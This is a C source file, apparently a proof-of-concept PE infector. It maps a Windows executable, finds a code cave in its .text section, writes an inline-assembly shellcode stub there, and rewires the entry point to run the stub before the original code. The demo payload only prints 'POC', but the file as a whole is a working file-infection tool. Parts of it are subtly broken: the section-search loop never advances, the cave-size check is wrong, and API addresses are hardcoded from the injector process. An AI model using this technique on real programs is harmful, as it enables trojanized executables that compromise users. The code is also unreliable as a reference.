#include <stdio.h>
#include <Windows.h>

/***********************|
|			|
|	PAYLOAD		|
|			|
************************/

__declspec(naked) Payload(VOID) {
	__asm {

		pushad
			
		// GetStdHandle
		push	-11			// arg1 = -11 = stdout
		mov	eax, 0xAAAAAAAA		// placeholder for GetStdHandle address
		call	eax

		// WriteConsoleA
		push 	0x000a
		push 	'COP'
		mov 	ecx, esp		
		push	ebx
		mov	ebx, esp
		push	0			// arg5 = 0
		push	ebx			// arg4 = ptr to var (num chars written)
		push	5			// arg3 = len of string
		push	ecx			// arg2 = ptr to str "POC"
		push	eax			// arg1 = handle to stdout
		mov	eax, 0xBBBBBBBB		// placeholder for WriteConsoleA address
		call	eax
			
		popad

		push	0xCCCCCCCC		// placeholder for OEP
		ret

	}
} 
void PayloadEnd() {}

int main(int argc, char* argv[]) {

	/********************************************************************************************
	|											    |			
	|	(0) check number of arguments							    |
	|									      		    |
	********************************************************************************************/

	if (argc != 2) {
		fprintf(stderr, "[!] Usage: %s <TARGET>\n", argv[0]);
		exit(1);
	}

	/********************************************************************************************
	|						    					    |
	|	(1) open and map target file							    |
	|											    |
	********************************************************************************************/

	HANDLE hTarget, hTargetMapping;
	DWORD dwTargetSize;
	LPBYTE lpTarget;

	// open target file
	hTarget = CreateFile(argv[1], FILE_READ_ACCESS | FILE_WRITE_ACCESS, 0, NULL, OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);
	if (hTarget == INVALID_HANDLE_VALUE) {
		perror("[!] CreateFile:");
		exit(1);
	}

	// get target file disk size
	dwTargetSize = GetFileSize(hTarget, NULL);

	// map target file to memory
	hTargetMapping = CreateFileMapping(hTarget, NULL, PAGE_READWRITE, 0, dwTargetSize, NULL);
	if (hTargetMapping == NULL) {
		perror("[!] CreateFileMapping:");
		exit(1);
	}

	// get ptr to beginning of target file in memory 
	lpTarget = (LPBYTE)MapViewOfFile(hTargetMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, dwTargetSize);

	/********************************************************************************************
	|											    |
	|	(2) get target file info	 						    |
	|											    |
	********************************************************************************************/

	PIMAGE_DOS_HEADER pidh;
	PIMAGE_NT_HEADERS pinh;

	// get PE header 
	pidh = (PIMAGE_DOS_HEADER)lpTarget;				// DOS header
	pinh = (PIMAGE_NT_HEADERS)((DWORD)pidh + pidh->e_lfanew);	// PE header

	/********************************************************************************************
	|									 		    |
	|	(3) get payload info 								    |
	|											    |
	********************************************************************************************/

	/***********************************************
	|	(c) get payload size		       |
	***********************************************/

	DWORD dwShellcodeSize = (DWORD)PayloadEnd - (DWORD)Payload;

	/********************************************************************************************
	|											    |
	|	(4) find code cave	 							    |
	|									 		    |
	********************************************************************************************/

	/***********************************************
	|	(a) find .text section 		       |
	***********************************************/

	int i;
	PIMAGE_SECTION_HEADER pish;

	// get FIRST section header 
	pish = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pinh);

	// iterate through section headers looking for .text section
	for (i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
		if (!strcmp(pish->Name, ".text")) {
			break;
			pish += 1;
		}
	}

	/***********************************************
	|	(b) find code cave  		       |
	***********************************************/

	DWORD dwCodecaveOffset, dwCount = 0;
	LPBYTE lpSectionPointer = lpTarget + pish->PointerToRawData;
	
	for (i = 0; i < pish->SizeOfRawData; i++) {
		if (*(lpSectionPointer) == 0x00) {
			if (dwCount == 0) {
				dwCodecaveOffset = pish->PointerToRawData + i;
			}
			dwCount++;
			if (dwCount == dwShellcodeSize) {
				break;
			}
		}
		else {
			dwCount = 0;
		}
		lpSectionPointer++;
	}

	// if sufficienty sized code cave not found, print error and exit
	if (dwCount == 0) {
		fprintf(stderr, "No sufficiently sized code cave found\n");
		exit(1);
	}

	/********************************************************************************************
	|									   		    |
	|	(5) inject shellcode into code cave 						    |
	|											    |
	********************************************************************************************/

	/* copy shellcode into code cave */
	memcpy((LPBYTE)(lpTarget + dwCodecaveOffset), Payload, dwShellcodeSize);

	/********************************************************************************************
	|											    |
	|	(6) patch target file				 				    |
	|											    |
	********************************************************************************************/

	/***********************************************
	|	(a) set entry point to payload	       |
	***********************************************/
	
	/** get original entry point (OEP) **/
	DWORD dwOEP = pinh->OptionalHeader.AddressOfEntryPoint + pinh->OptionalHeader.ImageBase;
	
	pinh->OptionalHeader.AddressOfEntryPoint = dwCodecaveOffset + pish->VirtualAddress - pish->PointerToRawData;
	
	/***********************************************
	|	(b) set payload to orig. entry point   |
	***********************************************/
	
	for (i = 0; i < dwShellcodeSize; i++) {
		if (*(LPDWORD)((int)lpTarget + dwCodecaveOffset + i) == 0xCCCCCCCC) {
			*(LPDWORD)((int)lpTarget + dwCodecaveOffset + i) = (DWORD)dwOEP;
			break;
		}
	}
	
	/***********************************************
	|	(c) augment section size	       |
	***********************************************/

	pish->Misc.VirtualSize += dwShellcodeSize;

	/***********************************************
	|	(e) set payload function addresses     |
	***********************************************/

	HMODULE hLibrary = LoadLibrary("kernel32.dll");
	LPVOID lpGetStdHandle = GetProcAddress(hLibrary, "GetStdHandle");
	LPVOID lpWriteConsoleA = GetProcAddress(hLibrary, "WriteConsoleA");

	for (i = 0; i < dwShellcodeSize; i++) {
		if (*(LPDWORD)((int)lpTarget + dwCodecaveOffset + i) == 0xAAAAAAAA) {
			*(LPDWORD)((int)lpTarget + dwCodecaveOffset + i) = (DWORD)lpGetStdHandle;
		}
		else if (*(LPDWORD)((int)lpTarget + dwCodecaveOffset + i) == 0xBBBBBBBB) {
			*(LPDWORD)((int)lpTarget + dwCodecaveOffset + i) = (DWORD)lpWriteConsoleA;
			FreeLibrary(hLibrary);
			break;
		}
	}

	CloseHandle(hTarget);
	exit(0);

}
